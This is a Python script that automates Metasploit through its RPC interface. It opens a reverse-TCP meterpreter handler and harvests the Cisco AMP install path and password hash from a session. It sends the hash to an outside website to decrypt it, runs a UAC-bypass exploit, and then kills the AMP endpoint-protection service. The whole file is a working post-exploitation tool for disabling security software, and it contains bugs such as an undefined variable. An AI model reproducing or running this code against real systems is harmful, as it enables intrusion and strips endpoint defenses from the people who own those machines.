import os, msfrpc, optparse, sys, subprocess
from time import sleep
 
# Function to create the MSF .rc files
def builder(FILE,COMMS):
     post = open(FILE, 'w')
     post.write(COMMS)
     post.close()
 
# START CONSOLE COMMANDS
def sploiter(LHOST, LPORT, session):
     # INITIATE RPC CONNECTION
     client = msfrpc.Msfrpc({})
     client.login('msf', 'abc123')
     ress = client.call('console.create')
     console_id = ress['id']

     # BUILD AP2.PY RC FILE
     builder('/tmp/smbpost.rc', """load python
python_import -f /etc/amp/apf2.py
""")
     # SETUP HANDLER 
     commands = """use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST """+LHOST+"""
set LPORT """+LPORT+"""
set ExitOnSession false
exploit
"""
     client.call('console.write',[console_id,commands])
     res = client.call('console.read',[console_id])
     result = res['data'].split('n')
   
 
     # Run Post-exploit script 
     runPost = """use post/multi/gather/run_console_rc_file
set RESOURCE /tmp/smbpost.rc
set SESSION """+session+"""
exploit
"""
     client.call('console.write',[console_id,runPost])
     sleep(8)
     test_met = client.call('session.meterpreter_read',[session])
     SFC_PATH = test_met['data'].split('AMPDIR::')[1].split('::ENDDIR')[0]
     PASS_HASH = test_met['data'].split('AMPHASH::')[1].split('::ENDHASH')[0]
     print '\nMETERPRETER\n'
     print str(SFC_PATH) + '\n'
     print str(PASS_HASH)

     import urllib2
     import urllib
     ENC_PASS_HASH = urllib.quote_plus(PASS_HASH)
     AMP_PASS_REQ = urllib2.urlopen("http://www.actforit.com/amp_decrypt.php?password="+str(ENC_PASS_HASH)).read()
     AMP_PASS = AMP_PASS_REQ.split('Password is: <br><br>')[1].split('<br><br><br>')[0]
     print 'PASSWORD: ' + str(AMP_PASS)
     print '[+]::BEGINNING UAC BYPASS'

     # BUILD UAC HIJACK RC TEMP FILE     
     builder('/tmp/smbposta.rc',"""background
use exploit/windows/local/bypassuac_comhijack
set payload windows/x64/meterpreter/reverse_tcp
set session """+session+"""
set lhost """+LHOST+"""
set lport 4488
exploit
""")
     # EXECUTE UAC RC FILE
     runPosta = """use post/multi/gather/run_console_rc_file
set RESOURCE /tmp/smbposta.rc
set SESSION """+session+"""
exploit
"""
     client.call('console.write',[console_id,postacomms])
     sleep(3)
     sleep(12)
     
     #BUILD AND EXECUTE AMP SERVICE KILLER
     print '[+]::KILLING AMP'
     client.call('console.read',[console_id])
     builder('/tmp/smbpostb.rc', """execute -f 'cmd.exe /c \""""+SFC_PATH+"""\" -k """+AMP_PASS+"""'
""")
     ELEV_SESS = int(session) + 1
     print ELEV_SESS
     runPostb = """background
getsystem
use post/multi/gather/run_console_rc_file
set RESOURCE /tmp/smbpostb.rc
set SESSION """+str(ELEV_SESS)+"""
exploit
"""
     client.call('console.write',[console_id,runPostb])
     client.call('session.meterpreter_read',[session])
  
     
 
 
def main():
        parser = optparse.OptionParser(sys.argv[0] +
        ' -p LPORT -l LHOST')
        parser.add_option('-p', dest='LPORT', type='string', 
        help ='specify a port to listen on')
        parser.add_option('-l', dest='LHOST', type='string', 
        help='Specify a local host')
        parser.add_option('-s', dest='session', type='string', 
        help ='specify session ID')
        (options, args) = parser.parse_args()
        session=options.session
        LHOST=options.LHOST; LPORT=options.LPORT
 
        if(LPORT == None) and (LHOST == None):
                print parser.usage
                sys.exit(0)
 	RHOST = ''
        sploiter(LHOST, LPORT, session)
 
if __name__ == "__main__":
      main()
